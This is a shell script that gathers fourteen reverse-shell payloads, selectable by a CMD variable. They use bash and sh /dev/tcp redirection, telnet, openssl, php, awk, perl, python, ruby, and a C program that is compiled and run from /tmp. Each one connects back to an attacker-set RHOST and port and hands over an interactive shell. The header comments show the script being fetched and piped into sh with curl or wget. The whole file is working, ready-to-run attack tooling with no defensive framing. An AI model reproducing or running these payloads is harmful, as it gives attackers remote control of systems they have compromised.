#
# Nothing new, these can all be found with a simple google search
#
# [client]$ curl http://$RHOST/sh|sh
# [client]$ wget -O- http://$RHOST/sh|sh
#
#####
CMD=6
RHOST='127.0.0.1'
RPORT=12345
# openssl/telnet listner ports
#   openssl req -x509 -newkey rsa:2048 -keyout /tmp/key.pem -out /tmp/cert.pem -days 365 -nodes
#   openssl s_server -key /tmp/key.pem -cert /tmp/cert.pem -port 6666 // CMDPORT
#   openssl s_server -key /tmp/key.pem -cert /tmp/cert.pem -port 7777 // OUTPORT
CMDPORT=6666 # listener cmd port
OUTPORT=7777 # listener output port
#
[ $CMD == 1 ] && sh -i >& /dev/tcp/$RHOST/$RPORT 0>&1
[ $CMD == 2 ] && bash -i >& /dev/tcp/$RHOST/$RPORT 0>&1
[ $CMD == 3 ] && /bin/sh -i >& /dev/tcp/$RHOST/$RPORT 0>&1
[ $CMD == 4 ] && /bin/bash -i >& /dev/tcp/$RHOST/$RPORT 0>&1
[ $CMD == 5 ] && telnet $RHOST $CMDPORT|/bin/sh|telnet $RHOST $OUTPORT
[ $CMD == 6 ] && mknod /tmp/s p && telnet $RHOST $RPORT 0</tmp/s | sh 1>/tmp/s
[ $CMD == 7 ] && openssl s_client -quiet -connect $RHOST:$CMDPORT | sh 2>&1 | openssl s_client -quiet -connect $RHOST:$OUTPORT
#
[ $CMD == 8 ] &&  php -r '$sock=fsockopen("'"$RHOST"'",'"$RPORT"');exec("/bin/sh -i <&3 >&3 2>&3");'
# To kill awk shell, type ^C from the remote nc listener
# To keep awk shell running, type "exit"
[ $CMD == 9 ] && \
awk 'BEGIN {s = "/inet/tcp/0/'"$RHOST"'/'"$RPORT"'"; while(1) { do{ printf "sh>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null
#
# Background awk shell, always running ;)
[ $CMD == 10 ] && \
awk 'BEGIN {s = "/inet/tcp/0/'"$RHOST"'/'"$RPORT"'"; while(1) { do{ printf "sh>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null &
[ $CMD == 11 ] && \
perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"'"$RHOST"':'"$RPORT"'");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
#perl -e 'use Socket;$i="'"$RHOST"'";$p='"$RPORT"';socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
[ $CMD == 12 ] && \
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("'"$RHOST"'",'"$RPORT"'));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
[ $CMD == 13 ] && \
ruby -rsocket -e 'exit if fork;c=TCPSocket.new("'"$RHOST"'","'"$RPORT"'");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
#
if [ $CMD == 14 ]; then
cat << _EOF_ > /tmp/csh.c
#include <stdio.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#define RHOST "$RHOST"
#define RPORT $RPORT
int main(void){
int port = RPORT;
struct sockaddr_in revsockaddr;
int sockt = socket(AF_INET, SOCK_STREAM, 0);
revsockaddr.sin_family = AF_INET;
revsockaddr.sin_port = htons(port);
revsockaddr.sin_addr.s_addr = inet_addr(RHOST);
connect(sockt, (struct sockaddr *) &revsockaddr,
sizeof(revsockaddr));
dup2(sockt, 0);
dup2(sockt, 1);
dup2(sockt, 2);
char * const argv[] = {"/bin/sh", NULL};
execve("/bin/sh", argv, NULL);
return 0;
}
_EOF_
gcc /tmp/csh.c -o /tmp/csh && /tmp/csh
fi
